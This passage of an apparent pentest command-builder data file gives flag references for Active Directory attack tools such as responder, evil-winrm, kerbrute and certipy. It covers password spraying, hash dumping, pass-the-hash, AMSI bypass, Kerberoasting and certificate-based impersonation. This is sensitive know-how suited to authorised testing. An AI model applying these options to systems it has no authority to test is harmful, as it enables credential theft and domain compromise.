    desc: M('Швейцарский нож аудита домена и сети: проверка кредов, enum SMB/LDAP, dump секретов, выполнение команд по WMI/SMB, модули по списку хостов. Наследник CrackMapExec.', 'Swiss army knife for domain and network auditing: credential checks, SMB/LDAP enumeration, secrets dumping, command execution over WMI/SMB, and running modules across a host list at once. Direct successor to CrackMapExec.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('Username or a file with a list of names.', 'Username or a file with a list of names.'), value:'user' },
      { id:'_p', flag:'-p', help: M('Password or a file with a list of passwords (tried against all -u).', 'Password or a file with a list of passwords (tried against all -u).'), value:'password' },
      { id:'_h', flag:'-H', help: M('NTLM hash for Pass-the-Hash instead of a password.', 'NTLM hash for Pass-the-Hash instead of a password.'), value:'NTHASH' },
      { id:'_k', flag:'-k', help: M('Authenticate via Kerberos (uses a ticket from the environment / ccache).', 'Authenticate via Kerberos (uses a ticket from the environment / ccache).') },
      { id:'__local_auth', flag:'--local-auth', help: M('Local authentication on the host rather than domain (for local accounts).', 'Local authentication on the host rather than domain (for local accounts).') },
      { id:'_d', flag:'-d', help: M('Domain for domain authentication.', 'Domain for domain authentication.'), value:'domain.local' },
      { id:'__kdchost', flag:'--kdcHost', help: M('Address of the KDC/domain controller (needed for Kerberos).', 'Address of the KDC/domain controller (needed for Kerberos).'), value:'{TARGET}' },
      { id:'__continue_on_success', flag:'--continue-on-success', help: M('Do not stop after the first valid login - for password spray across a list.', 'Do not stop after the first valid login - for password spray across a list.') },
      { id:'__shares', flag:'--shares', help: M('Enumerate network shares and access rights (READ/WRITE) to them.', 'Enumerate network shares and access rights (READ/WRITE) to them.') },
      { id:'__users', flag:'--users', help: M('Enumerate domain users.', 'Enumerate domain users.') },
      { id:'__rid_brute', flag:'--rid-brute', help: M('Brute-force RIDs to extract users (works even with a null session). Optional max RID.', 'Brute-force RIDs to extract users (works even with a null session). Optional max RID.'), value:'4000' },
      { id:'__pass_pol', flag:'--pass-pol', help: M('Retrieve the domain password policy.', 'Retrieve the domain password policy.') },
      { id:'__sam', flag:'--sam', help: M('Dump local hashes from SAM (requires admin rights).', 'Dump local hashes from SAM (requires admin rights).') },
      { id:'__ntds', flag:'--ntds', help: M('Dump hashes of all domain accounts from NTDS.dit (on the DC, via DRSUAPI).', 'Dump hashes of all domain accounts from NTDS.dit (on the DC, via DRSUAPI).') },
      { id:'__groups', flag:'--groups', help: M('Enumerate domain groups (or members of a specific group).', 'Enumerate domain groups (or members of a specific group).'), value:'Domain Admins' },
      { id:'__local_groups', flag:'--local-groups', help: M('Enumerate local groups on the host.', 'Enumerate local groups on the host.') },
      { id:'__sessions', flag:'--sessions', help: M('Show active sessions on the host.', 'Show active sessions on the host.') },
      { id:'__loggedon_users', flag:'--loggedon-users', help: M('Show logged-on users.', 'Show logged-on users.') },
      { id:'__disks', flag:'--disks', help: M('Enumerate disks on the host.', 'Enumerate disks on the host.') },
      { id:'__lsa', flag:'--lsa', help: M('Dump LSA secrets.', 'Dump LSA secrets.') },
      { id:'_x', flag:'-x', help: M('Run a command via cmd on the target.', 'Run a command via cmd on the target.'), value:'whoami' },
      { id:'__exec_method', flag:'--exec-method', help: M('Execution method: wmiexec, atexec, smbexec, mmcexec.', 'Execution method: wmiexec, atexec, smbexec, mmcexec.'), value:'wmiexec' },
      { id:'_l', flag:'-L', help: M('Show the list of available modules for the protocol.', 'Show the list of available modules for the protocol.') },
      { id:'_m', flag:'-M', help: M('Run a module by name.', 'Run a module by name.'), value:'spider_plus' },
      { id:'_o', flag:'-o', help: M('Pass options to the module (KEY=value, multiple allowed). List options via --options.', 'Pass options to the module (KEY=value, multiple allowed). List options via --options.'), value:'KEY=value' },
      { id:'__options', flag:'--options', help: M('Show options of the selected module (-M ... --options).', 'Show options of the selected module (-M ... --options).') },
      { id:'__asreproast', flag:'--asreproast', help: M('Collect AS-REP hashes of users without pre-authentication (to a file).', 'Collect AS-REP hashes of users without pre-authentication (to a file).'), value:'asrep.txt' },
      { id:'__kerberoasting', flag:'--kerberoasting', help: M('Collect TGS hashes of service accounts (Kerberoasting, to a file).', 'Collect TGS hashes of service accounts (Kerberoasting, to a file).'), value:'kerb.txt' },
      { id:'__trusted_for_delegation', flag:'--trusted-for-delegation', help: M('Find accounts with unconstrained delegation.', 'Find accounts with unconstrained delegation.') },
      { id:'__bloodhound', flag:'--bloodhound', help: M('Collect data for BloodHound via LDAP (with --collection).', 'Collect data for BloodHound via LDAP (with --collection).') },
    ],
  },
  {
    id: 'enum4linux-ng',
    name: 'enum4linux-ng',
    base: 'enum4linux-ng',
    desc: M('enum4linux на Python: за один проход собирает users, groups, shares, password policy, OS, RID-cycling с SMB/RPC и экспорт в JSON/YAML. Быстрый recon Windows/Samba.', 'enum4linux rewritten in Python: in a single run it collects users, groups, shares, password policy, OS, RID-cycling from an SMB/RPC host and exports to JSON/YAML. Handy for quick Windows/Samba recon.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_a', flag:'-A', help: M('Full \'simple\' enumeration: users, groups, shares, policy, OS, NetBIOS, printers (-U -G -S -P -O -N -I -L).', 'Full \'simple\' enumeration: users, groups, shares, policy, OS, NetBIOS, printers (-U -G -S -P -O -N -I -L).') },
      { id:'_as', flag:'-As', help: M('Same as -A but without NetBIOS queries.', 'Same as -A but without NetBIOS queries.') },
      { id:'_r', flag:'-R', help: M('RID-cycling - brute-forcing RIDs to extract users. Optional batch size.', 'RID-cycling - brute-forcing RIDs to extract users. Optional batch size.'), value:'100' },
      { id:'_v', flag:'-v', help: M('Verbose output.', 'Verbose output.') },
      { id:'_u', flag:'-U', help: M('Retrieve users via RPC.', 'Retrieve users via RPC.') },
      { id:'_g', flag:'-G', help: M('Retrieve groups via RPC.', 'Retrieve groups via RPC.') },
      { id:'_gm', flag:'-Gm', help: M('Retrieve groups along with their members via RPC.', 'Retrieve groups along with their members via RPC.') },
      { id:'_s', flag:'-S', help: M('Retrieve shares via RPC.', 'Retrieve shares via RPC.') },
      { id:'_p', flag:'-P', help: M('Retrieve the password policy via RPC.', 'Retrieve the password policy via RPC.') },
      { id:'_o', flag:'-O', help: M('Retrieve OS information.', 'Retrieve OS information.') },
      { id:'_l', flag:'-L', help: M('Retrieve domain information via LDAP/LDAPS.', 'Retrieve domain information via LDAP/LDAPS.') },
      { id:'_i', flag:'-I', help: M('Retrieve printer information via RPC.', 'Retrieve printer information via RPC.') },
      { id:'_n', flag:'-N', help: M('NetBIOS name lookup.', 'NetBIOS name lookup.') },
      { id:'_c', flag:'-C', help: M('Retrieve services via RPC.', 'Retrieve services via RPC.') },
      { id:'_h', flag:'-H', help: M('Authentication with an NT hash.', 'Authentication with an NT hash.'), value:'NTHASH' },
      { id:'_k', flag:'-K', help: M('Authentication via a Kerberos ticket (for AD).', 'Authentication via a Kerberos ticket (for AD).'), value:'ticket.ccache' },
      { id:'__local_auth', flag:'--local-auth', help: M('Local authentication rather than domain.', 'Local authentication rather than domain.') },
      { id:'_w', flag:'-w', help: M('Specify the workgroup/domain (auto-detected by default).', 'Specify the workgroup/domain (auto-detected by default).'), value:'DOMAIN' },
      { id:'_d', flag:'-d', help: M('Detailed information on users and groups (with -U/-G/-R).', 'Detailed information on users and groups (with -U/-G/-R).') },
      { id:'_t', flag:'-t', help: M('Connection timeout in seconds (default 10).', 'Connection timeout in seconds (default 10).'), value:'10' },
      { id:'_oj', flag:'-oJ', help: M('Export results to JSON (extension added automatically).', 'Export results to JSON (extension added automatically).'), value:'out' },
      { id:'_oy', flag:'-oY', help: M('Export results to YAML.', 'Export results to YAML.'), value:'out' },
      { id:'_oa', flag:'-oA', help: M('Export to both JSON and YAML at once.', 'Export to both JSON and YAML at once.'), value:'out' },
    ],
  },
  {
    id: 'smbclient',
    name: 'smbclient',
    base: 'smbclient',
    desc: M('smbclient — FTP-подобный клиент SMB: shares, list, download/upload. smbmap — массовый enum shares с правами, рекурсией и выполнением команд.', 'smbclient is an FTP-like client for connecting to SMB shares, listing, and downloading/uploading files. smbmap does mass share enumeration with access-rights display, recursive traversal, and command execution.'),
    targetPlaceholder: '-L //{TARGET}',
    flags: [
      { id:'_l', flag:'-L', help: M('Enumerate available shares on the server (//host or host).', 'Enumerate available shares on the server (//host or host).'), value:'//{TARGET}' },
      { id:'_p', flag:'-p', help: M('SMB port (default 445).', 'SMB port (default 445).'), value:'445' },
      { id:'_m', flag:'-m', help: M('Maximum SMB protocol version (SMB2/SMB3).', 'Maximum SMB protocol version (SMB2/SMB3).'), value:'SMB3' },
      { id:'_i', flag:'-I', help: M('Explicitly set the target IP (if the name does not resolve).', 'Explicitly set the target IP (if the name does not resolve).'), value:'{TARGET}' },
      { id:'_u', flag:'-U', help: M('Username (can be DOMAIN/user or user%password).', 'Username (can be DOMAIN/user or user%password).'), value:'user' },
      { id:'_n', flag:'-N', help: M('No password (anonymous/null access) - do not prompt for a password.', 'No password (anonymous/null access) - do not prompt for a password.') },
      { id:'__pw_nt_hash', flag:'--pw-nt-hash', help: M('Treat the password from -U as an NT hash (Pass-the-Hash).', 'Treat the password from -U as an NT hash (Pass-the-Hash).') },
      { id:'_k', flag:'-k', help: M('Authenticate via Kerberos.', 'Authenticate via Kerberos.') },
      { id:'_w', flag:'-W', help: M('Workgroup/domain.', 'Workgroup/domain.'), value:'DOMAIN' },
      { id:'_c', flag:'-c', help: M('Run commands non-interactively (separated by ;): ls, get, put, mget...', 'Run commands non-interactively (separated by ;): ls, get, put, mget...'), value:'ls; get file' },
      { id:'_d', flag:'-d', help: M('Debug level.', 'Debug level.'), value:'1' },
      { id:'_g', flag:'-g', help: M('Machine-readable (grep-friendly) output.', 'Machine-readable (grep-friendly) output.') },
      { id:'ls', flag:'ls', help: M('List files in the current directory of the share.', 'List files in the current directory of the share.') },
      { id:'get', flag:'get', help: M('Download a file from the share.', 'Download a file from the share.'), value:'file' },
      { id:'put', flag:'put', help: M('Upload a file to the share.', 'Upload a file to the share.'), value:'file' },
      { id:'mget', flag:'mget', help: M('Download multiple files by mask (with prompt OFF / recurse ON).', 'Download multiple files by mask (with prompt OFF / recurse ON).'), value:'*' },
      { id:'cd', flag:'cd', help: M('Change to a directory on the share.', 'Change to a directory on the share.'), value:'dir' },
    ],
  },
  {
    id: 'rpcclient',
    name: 'rpcclient',
    base: 'rpcclient',
    desc: M('Клиент MS-RPC на Windows/Samba. Ручной enum домена через null session или креды: users, groups, SID, password policy, info сервера.', 'A client for calling MS-RPC functions on Windows/Samba. The main tool for manual domain enumeration via a null session or with credentials: users, groups, SIDs, password policy, server information.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_u', flag:'-U', help: M('Credentials (user, user%password, or DOMAIN/user).', 'Credentials (user, user%password, or DOMAIN/user).'), value:'user%password' },
      { id:'_n', flag:'-N', help: M('No password - null session (anonymous).', 'No password - null session (anonymous).') },
      { id:'_w', flag:'-W', help: M('Workgroup/domain.', 'Workgroup/domain.'), value:'DOMAIN' },
      { id:'_k', flag:'-k', help: M('Authenticate via Kerberos.', 'Authenticate via Kerberos.') },
      { id:'__pw_nt_hash', flag:'--pw-nt-hash', help: M('Treat the password from -U as an NT hash (Pass-the-Hash).', 'Treat the password from -U as an NT hash (Pass-the-Hash).') },
      { id:'_c', flag:'-c', help: M('Run command(s) non-interactively (separated by ;) instead of an interactive session.', 'Run command(s) non-interactively (separated by ;) instead of an interactive session.'), value:'enumdomusers' },
      { id:'enumdomusers', flag:'enumdomusers', help: M('List domain users and their RIDs.', 'List domain users and their RIDs.') },
      { id:'enumdomgroups', flag:'enumdomgroups', help: M('List domain groups and their RIDs.', 'List domain groups and their RIDs.') },
      { id:'querydispinfo', flag:'querydispinfo', help: M('Users with names, full name, and description (often sees more than enumdomusers).', 'Users with names, full name, and description (often sees more than enumdomusers).') },
      { id:'queryuser', flag:'queryuser', help: M('Detailed information about a user by RID.', 'Detailed information about a user by RID.'), value:'0x457' },
      { id:'queryusergroups', flag:'queryusergroups', help: M('A user\'s groups by their RID.', 'A user\'s groups by their RID.'), value:'0x457' },
      { id:'lsaquery', flag:'lsaquery', help: M('Retrieve the domain SID and name.', 'Retrieve the domain SID and name.') },
      { id:'lookupnames', flag:'lookupnames', help: M('Get the SID for an account name.', 'Get the SID for an account name.'), value:'administrator' },
      { id:'lookupsids', flag:'lookupsids', help: M('Get the account name for a SID (manual RID-cycling).', 'Get the account name for a SID (manual RID-cycling).'), value:'S-1-5-21-...-500' },
      { id:'getdompwinfo', flag:'getdompwinfo', help: M('Domain password policy (minimum length, complexity).', 'Domain password policy (minimum length, complexity).') },
      { id:'enumdomains', flag:'enumdomains', help: M('List domains on the server.', 'List domains on the server.') },
      { id:'srvinfo', flag:'srvinfo', help: M('Server information (type, OS version).', 'Server information (type, OS version).') },
      { id:'netshareenumall', flag:'netshareenumall', help: M('Enumerate all shares via RPC.', 'Enumerate all shares via RPC.') },
      { id:'enumprinters', flag:'enumprinters', help: M('Enumerate printers.', 'Enumerate printers.') },
      { id:'lsaenumsid', flag:'lsaenumsid', help: M('Enumerate SIDs known to LSA.', 'Enumerate SIDs known to LSA.') },
    ],
  },
  {
    id: 'ldapsearch',
    name: 'ldapsearch',
    base: 'ldapsearch',
    desc: M('Стандартный клиент OpenLDAP для запросов к каталогу. В AD pentest — users, groups, descriptions, SPN, атрибуты через anonymous/authenticated bind.', 'The standard OpenLDAP client for directory queries. In AD pentesting - extracting users, groups, descriptions, SPNs, and attributes via anonymous or authenticated bind. Precise control over filters and attributes.'),
    targetPlaceholder: '-H ldap://{TARGET}',
    flags: [
      { id:'_h', flag:'-H', help: M('Server URI (ldap://host:389 or ldaps://host:636).', 'Server URI (ldap://host:389 or ldaps://host:636).'), value:'ldap://{TARGET}' },
      { id:'_x', flag:'-x', help: M('Simple authentication (required even for anonymous bind, instead of SASL).', 'Simple authentication (required even for anonymous bind, instead of SASL).') },
      { id:'_d', flag:'-D', help: M('Bind DN - the account for authentication (UPN or full DN).', 'Bind DN - the account for authentication (UPN or full DN).'), value:'user@domain.local' },
      { id:'_w', flag:'-w', help: M('Password on the command line.', 'Password on the command line.'), value:'password' },
      { id:'_y', flag:'-y', help: M('Read the password from a file.', 'Read the password from a file.'), value:'pass.txt' },
      { id:'_b', flag:'-b', help: M('Search base (Base DN) - the root to search from.', 'Search base (Base DN) - the root to search from.'), value:'DC=domain,DC=local' },
      { id:'_s', flag:'-s', help: M('Search scope: base, one, sub (sub by default).', 'Search scope: base, one, sub (sub by default).'), value:'sub' },
      { id:'_z', flag:'-z', help: M('Limit on the number of records in the response.', 'Limit on the number of records in the response.'), value:'1000' },
      { id:'_l', flag:'-l', help: M('Time limit for the search (seconds).', 'Time limit for the search (seconds).'), value:'60' },
      { id:'_lll', flag:'-LLL', help: M('Strip comments and the LDIF version from the output (clean result).', 'Strip comments and the LDIF version from the output (clean result).') },
      { id:'_o', flag:'-o', help: M('Output options; ldif-wrap=no disables wrapping of long lines.', 'Output options; ldif-wrap=no disables wrapping of long lines.'), value:'ldif-wrap=no' },
      { id:'_e', flag:'-E', help: M('Query extension; paged results (pr) to bypass the AD limit of 1000 records.', 'Query extension; paged results (pr) to bypass the AD limit of 1000 records.'), value:'pr=1000/noprompt' },
      { id:'_t', flag:'-t', help: M('Save binary attribute values to temporary files.', 'Save binary attribute values to temporary files.') },
      { id:'_objectclass___', flag:'(objectClass=*)', help: M('Search filter - the first positional argument after options.', 'Search filter - the first positional argument after options.') },
      { id:'_objectclass_user_', flag:'(objectClass=user)', help: M('Find all user objects.', 'Find all user objects.') },
      { id:'___objectclass_user__servicepr', flag:'(&(objectClass=user)(servicePrincipalName=*))', help: M('Accounts with an SPN - Kerberoasting candidates.', 'Accounts with an SPN - Kerberoasting candidates.') },
      { id:'samaccountname_description', flag:'sAMAccountName description', help: M('List of attributes to output - after the filter (otherwise all attributes).', 'List of attributes to output - after the filter (otherwise all attributes).') },
    ],
  },
  {
    id: 'kerbrute',
    name: 'kerbrute',
    base: 'kerbrute',
    desc: M('Быстрый и относительно тихий брут через Kerberos pre-auth: проверка логинов, password spray, brute. Не даёт event 4625 при failed pre-auth — тише обычных методов.', 'Fast and relatively quiet brute force via Kerberos pre-auth: username validation, password spray, and brute force. Does not trigger event 4625 on a failed pre-authentication, so it is stealthier than typical methods.'),
    targetPlaceholder: '--dc {TARGET}',
    flags: [
      { id:'__dc', flag:'--dc', help: M('Address of the domain controller (KDC). If not set, it is looked up via DNS.', 'Address of the domain controller (KDC). If not set, it is looked up via DNS.'), value:'{TARGET}' },
      { id:'_d', flag:'-d', help: M('Fully qualified domain name (e.g. contoso.com). One of --dc/-d is required.', 'Fully qualified domain name (e.g. contoso.com). One of --dc/-d is required.'), value:'domain.local' },
      { id:'_t', flag:'-t', help: M('Number of threads (default 10).', 'Number of threads (default 10).'), value:'10' },
      { id:'__delay', flag:'--delay', help: M('Delay between attempts (ms); enables single-threaded mode.', 'Delay between attempts (ms); enables single-threaded mode.'), value:'100' },
      { id:'__safe', flag:'--safe', help: M('Abort if a locked account is detected (protection against lockout).', 'Abort if a locked account is detected (protection against lockout).') },
      { id:'_o', flag:'-o', help: M('Write the log to a file.', 'Write the log to a file.'), value:'results.txt' },
      { id:'_v', flag:'-v', help: M('Log failures and errors (only successes by default).', 'Log failures and errors (only successes by default).') },
      { id:'__downgrade', flag:'--downgrade', help: M('Force weak encryption (arcfour-hmac-md5).', 'Force weak encryption (arcfour-hmac-md5).') },
      { id:'users_txt', flag:'users.txt', help: M('File with a list of usernames to check (positional).', 'File with a list of usernames to check (positional).') },
      { id:'password1', flag:'Password1', help: M('A single password to test against all (2nd positional).', 'A single password to test against all (2nd positional).') },
      { id:'passwords_txt', flag:'passwords.txt', help: M('bruteuser: password wordlist (1st positional), then the username (2nd).', 'bruteuser: password wordlist (1st positional), then the username (2nd).') },
      { id:'combos_txt', flag:'combos.txt', help: M('bruteforce: file with user:password pairs (or \'-\' for stdin).', 'bruteforce: file with user:password pairs (or \'-\' for stdin).') },
    ],
  },
  {
    id: 'responder',
    name: 'responder',
    base: 'responder',
    desc: M('Poisoner протоколов разрешения имён (LLMNR, NBT-NS, MDNS) с rogue HTTP/SMB/MSSQL/LDAP. Ловит NTLMv1/v2 с broadcast-запросов жертв для крэка или relay.', 'A poisoner for name resolution protocols (LLMNR, NBT-NS, MDNS) with built-in rogue HTTP/SMB/MSSQL/LDAP servers. Captures NTLMv1/v2 hashes from victims\' broadcast queries for subsequent cracking or relay.'),
    targetPlaceholder: 'TARGET',
    flags: [
      { id:'_i', flag:'-I', help: M('Network interface to listen on (required).', 'Network interface to listen on (required).'), value:'tun0' },
      { id:'_a', flag:'-A', help: M('Analysis mode - only observe requests, do NOT respond (passive recon).', 'Analysis mode - only observe requests, do NOT respond (passive recon).') },
      { id:'_v', flag:'-v', help: M('Verbose output.', 'Verbose output.') },
      { id:'_q', flag:'-Q', help: M('Quiet mode.', 'Quiet mode.') },
      { id:'_w', flag:'-w', help: M('Enable the rogue WPAD proxy (capture browser HTTP authentication).', 'Enable the rogue WPAD proxy (capture browser HTTP authentication).') },
      { id:'_f', flag:'-F', help: M('Force authentication for WPAD (rogue PAC requires login).', 'Force authentication for WPAD (rogue PAC requires login).') },
      { id:'_p', flag:'-P', help: M('Force authentication on the proxy (together with -w).', 'Force authentication on the proxy (together with -w).') },
      { id:'_d', flag:'-d', help: M('Respond to NetBIOS domain suffix queries.', 'Respond to NetBIOS domain suffix queries.') },
      { id:'_r', flag:'-r', help: M('Respond to NetBIOS wredir queries (careful - noisy).', 'Respond to NetBIOS wredir queries (careful - noisy).') },
      { id:'__dhcpv6', flag:'--dhcpv6', help: M('Enable DHCPv6 poisoning (mitm6-like).', 'Enable DHCPv6 poisoning (mitm6-like).') },
      { id:'_b', flag:'-b', help: M('Serve Basic HTTP authentication instead of NTLM (cleartext passwords).', 'Serve Basic HTTP authentication instead of NTLM (cleartext passwords).') },
      { id:'__lm', flag:'--lm', help: M('Force a downgrade to LM hashes (easier to crack) on old clients.', 'Force a downgrade to LM hashes (easier to crack) on old clients.') },
      { id:'__disable_ess', flag:'--disable-ess', help: M('Disable Extended Session Security (NTLMv1 downgrade).', 'Disable Extended Session Security (NTLMv1 downgrade).') },
      { id:'_e', flag:'-E', help: M('Return an error code instead of an authentication challenge (force a retry).', 'Return an error code instead of an authentication challenge (force a retry).') },
      { id:'_u', flag:'-u', help: M('Upstream proxy for captured traffic.', 'Upstream proxy for captured traffic.'), value:'HOST:PORT' },
    ],
  },
  {
    id: 'evil-winrm',
    name: 'evil-winrm',
    base: 'evil-winrm',
    desc: M('Полноценный shell к Windows по WinRM (5985/5986). Pass-the-Hash, Kerberos, upload/download, .NET assembly, AMSI bypass. Стандарт после получения кредов с WinRM.', 'A full-featured shell for remote access to Windows over WinRM (5985/5986). Supports Pass-the-Hash, Kerberos, file upload/download, .NET assembly execution, and AMSI bypass. The standard after obtaining credentials with WinRM access.'),
    targetPlaceholder: '-i {TARGET}',
    flags: [
      { id:'_i', flag:'-i', help: M('Target IP or hostname (required).', 'Target IP or hostname (required).'), value:'{TARGET}' },
      { id:'_p', flag:'-P', help: M('Port (default 5985; with -S becomes 5986).', 'Port (default 5985; with -S becomes 5986).'), value:'5985' },
      { id:'_s', flag:'-S', help: M('Enable SSL/TLS (port 5986).', 'Enable SSL/TLS (port 5986).') },
      { id:'_u', flag:'-U', help: M('Endpoint URL (default /wsman).', 'Endpoint URL (default /wsman).'), value:'/wsman' },
      { id:'_h', flag:'-H', help: M('NT hash for Pass-the-Hash (instead of a password).', 'NT hash for Pass-the-Hash (instead of a password).'), value:'NTHASH' },
      { id:'_r', flag:'-r', help: M('Realm for Kerberos authentication.', 'Realm for Kerberos authentication.'), value:'domain.local' },
      { id:'_k', flag:'-K', help: M('Kerberos ticket (ccache or kirbi).', 'Kerberos ticket (ccache or kirbi).'), value:'ticket.ccache' },
      { id:'__spn', flag:'--spn', help: M('SPN prefix for Kerberos (default HTTP).', 'SPN prefix for Kerberos (default HTTP).'), value:'HTTP' },
      { id:'_c', flag:'-c', help: M('Public certificate for certificate-based authentication.', 'Public certificate for certificate-based authentication.'), value:'cert.pem' },
      { id:'_a', flag:'-a', help: M('Custom connection User-Agent.', 'Custom connection User-Agent.'), value:'Mozilla/5.0' },
      { id:'_e', flag:'-e', help: M('Path to local C#/.NET assemblies (for Invoke-Binary).', 'Path to local C#/.NET assemblies (for Invoke-Binary).'), value:'/opt/bins/' },
      { id:'_l', flag:'-l', help: M('Log the session.', 'Log the session.') },
      { id:'_n', flag:'-N', help: M('Disable remote path autocompletion (if it is slow).', 'Disable remote path autocompletion (if it is slow).') },
      { id:'upload', flag:'upload', help: M('Upload a file from the attacker to the target.', 'Upload a file from the attacker to the target.'), value:'local remote' },
      { id:'download', flag:'download', help: M('Download a file from the target.', 'Download a file from the target.'), value:'remote local' },
      { id:'invoke_binary', flag:'Invoke-Binary', help: M('Execute a .NET assembly in memory (from the -e directory).', 'Execute a .NET assembly in memory (from the -e directory).'), value:'/path/exe.exe args' },
      { id:'bypass_4msi', flag:'Bypass-4MSI', help: M('Patch AMSI in memory.', 'Patch AMSI in memory.') },
      { id:'services', flag:'services', help: M('List services and rights on them.', 'List services and rights on them.') },
      { id:'menu', flag:'menu', help: M('Show loaded functions/commands.', 'Show loaded functions/commands.') },
    ],
  },
  {
    id: 'bloodhound-python',
    name: 'bloodhound-python',
    base: 'bloodhound-python',
    desc: M('bloodhound-python (BloodHound.py) — Python ingestor: users, groups, sessions, ACL, trusts, attack paths в JSON для BloodHound. Не нужен Windows — с Linux по сети.', 'bloodhound-python (BloodHound.py) is a Python ingestor: it collects users, groups, sessions, ACLs, trusts, and attack paths from the domain into JSON for import into BloodHound. Does not require running on Windows - works from Linux over the network.'),
    targetPlaceholder: '-ns {TARGET}',
    flags: [
      { id:'_ns', flag:'-ns', help: M('DNS server (usually the DC itself) - critical for resolving domain names.', 'DNS server (usually the DC itself) - critical for resolving domain names.'), value:'{TARGET}' },
      { id:'_dc', flag:'-dc', help: M('Name (FQDN) of the domain controller for queries.', 'Name (FQDN) of the domain controller for queries.'), value:'dc01.domain.local' },
      { id:'_gc', flag:'-gc', help: M('Global catalog server.', 'Global catalog server.'), value:'dc01.domain.local' },
      { id:'__dns_tcp', flag:'--dns-tcp', help: M('Use TCP for DNS queries.', 'Use TCP for DNS queries.') },
      { id:'_di', flag:'-di', help: M('Disable Global Catalog auto-detection (--disable-autogc).', 'Disable Global Catalog auto-detection (--disable-autogc).') },
      { id:'_u', flag:'-u', help: M('Username (UPN).', 'Username (UPN).'), value:'user@domain.local' },
      { id:'_p', flag:'-p', help: M('Password.', 'Password.'), value:'password' },
      { id:'__hashes', flag:'--hashes', help: M('NT hash (or LM:NT) for Pass-the-Hash.', 'NT hash (or LM:NT) for Pass-the-Hash.'), value:'LM:NT' },
      { id:'_k', flag:'-k', help: M('Authenticate via Kerberos.', 'Authenticate via Kerberos.') },
      { id:'_d', flag:'-d', help: M('Domain name (required).', 'Domain name (required).'), value:'domain.local' },
      { id:'__use_ldaps', flag:'--use-ldaps', help: M('Use LDAPS (636) instead of LDAP.', 'Use LDAPS (636) instead of LDAP.') },
      { id:'_c', flag:'-c', help: M('Collection methods: Default, All, Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, Container, RDP, DCOM, PSRemote, LoggedOn, DCOnly.', 'Collection methods: Default, All, Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, Container, RDP, DCOM, PSRemote, LoggedOn, DCOnly.'), value:'Default' },
      { id:'_w', flag:'-w', help: M('Number of worker threads (--workers).', 'Number of worker threads (--workers).'), value:'10' },
      { id:'__auth_method', flag:'--auth-method', help: M('Authentication method (auto/ntlm/kerberos).', 'Authentication method (auto/ntlm/kerberos).'), value:'auto' },
      { id:'_op', flag:'-op', help: M('Prefix for output file names (--outputprefix).', 'Prefix for output file names (--outputprefix).'), value:'prefix' },
      { id:'__zip', flag:'--zip', help: M('Pack the collected JSON into a single zip archive (handy for import).', 'Pack the collected JSON into a single zip archive (handy for import).') },
      { id:'_v', flag:'-v', help: M('Verbose output.', 'Verbose output.') },
    ],
  },
  {
    id: 'certipy',
    name: 'certipy',
    base: 'certipy',
    desc: M('Enum и эксплуатация AD Certificate Services. Уязвимые шаблоны (ESC1–16), запрос/подделка сертификатов, NTLM relay и Shadow Credentials для privesc и ATO.', 'A tool for enumerating and exploiting AD Certificate Services. Finds vulnerable certificate templates (ESC1-16), requests and forges certificates, performs NTLM relay and Shadow Credentials for privilege escalation and account takeover.'),
    targetPlaceholder: '-dc-ip {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('Username (UPN).', 'Username (UPN).'), value:'user@domain.local' },
      { id:'_p', flag:'-p', help: M('Password.', 'Password.'), value:'password' },
      { id:'_hashes', flag:'-hashes', help: M('NT hash (or LM:NT) for Pass-the-Hash.', 'NT hash (or LM:NT) for Pass-the-Hash.'), value:'LM:NT' },
      { id:'_k', flag:'-k', help: M('Authenticate via Kerberos.', 'Authenticate via Kerberos.') },
      { id:'_no_pass', flag:'-no-pass', help: M('Do not prompt for a password (with -k or when anonymous).', 'Do not prompt for a password (with -k or when anonymous).') },
      { id:'_dc_ip', flag:'-dc-ip', help: M('Domain controller IP.', 'Domain controller IP.'), value:'{TARGET}' },
      { id:'_ns', flag:'-ns', help: M('DNS server (usually the DC).', 'DNS server (usually the DC).'), value:'{TARGET}' },
      { id:'_target', flag:'-target', help: M('Target host (CA/server) to connect to.', 'Target host (CA/server) to connect to.'), value:'ca.domain.local' },
      { id:'_vulnerable', flag:'-vulnerable', help: M('Show only vulnerable templates (ESC).', 'Show only vulnerable templates (ESC).') },
      { id:'_enabled', flag:'-enabled', help: M('Only enabled (published) templates.', 'Only enabled (published) templates.') },
      { id:'_stdout', flag:'-stdout', help: M('Print the result to the console instead of files.', 'Print the result to the console instead of files.') },
      { id:'_bloodhound', flag:'-bloodhound', help: M('Export for BloodHound.', 'Export for BloodHound.') },
      { id:'_hide_admins', flag:'-hide-admins', help: M('Hide admin rights in the output (less noise).', 'Hide admin rights in the output (less noise).') },
      { id:'_ca', flag:'-ca', help: M('Name of the certification authority (CA).', 'Name of the certification authority (CA).'), value:'DOMAIN-CA' },
      { id:'_template', flag:'-template', help: M('Certificate template name.', 'Certificate template name.'), value:'User' },
      { id:'_upn', flag:'-upn', help: M('Inject a UPN into the SAN (ESC1 - impersonate another user).', 'Inject a UPN into the SAN (ESC1 - impersonate another user).'), value:'administrator@domain.local' },
      { id:'_dns', flag:'-dns', help: M('Inject a DNS name into the SAN.', 'Inject a DNS name into the SAN.'), value:'dc01.domain.local' },
      { id:'_sid', flag:'-sid', help: M('Inject a SID into the certificate.', 'Inject a SID into the certificate.'), value:'S-1-5-21-...-500' },
      { id:'_application_policies', flag:'-application-policies', help: M('Application policies (for ESC15).', 'Application policies (for ESC15).'), value:'Client Authentication' },
      { id:'_out', flag:'-out', help: M('Filename prefix for saving the .pfx.', 'Filename prefix for saving the .pfx.'), value:'cert' },
      { id:'_pfx', flag:'-pfx', help: M('The .pfx certificate file for authentication.', 'The .pfx certificate file for authentication.'), value:'cert.pfx' },
      { id:'_username', flag:'-username', help: M('Username for certificate-based authentication.', 'Username for certificate-based authentication.'), value:'administrator' },
      { id:'_domain', flag:'-domain', help: M('Domain for authentication.', 'Domain for authentication.'), value:'domain.local' },
      { id:'_ldap_shell', flag:'-ldap-shell', help: M('Open an LDAP shell after authentication.', 'Open an LDAP shell after authentication.') },
      { id:'_account', flag:'-account', help: M('Target account for Shadow Credentials.', 'Target account for Shadow Credentials.'), value:'target$' },
